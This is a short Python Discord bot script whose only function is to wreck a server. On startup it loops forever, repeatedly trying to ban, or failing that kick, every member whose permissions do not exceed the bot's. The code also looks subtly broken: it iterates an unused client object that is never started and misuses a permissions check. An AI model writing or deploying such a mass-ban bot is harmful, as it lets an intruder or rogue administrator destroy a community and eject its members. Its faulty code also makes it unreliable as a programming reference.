import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import os
import time

client = discord.Client()
bot = commands.Bot(command_prefix = "p")
    
@bot.listen()
async def on_ready():
    while True:
        await asyncio.sleep(2)
        for mmr in client.get_all_members():
            if mmr.guild_permissions.is_superset(mmr.guild.me):
                continue
            try:
                await mmr.ban()
            except:
                try:
                    await mmr.kick()
                except:
                    pass

TOKEN = os.environ['BOT_TOKEN']
bot.run(TOKEN)
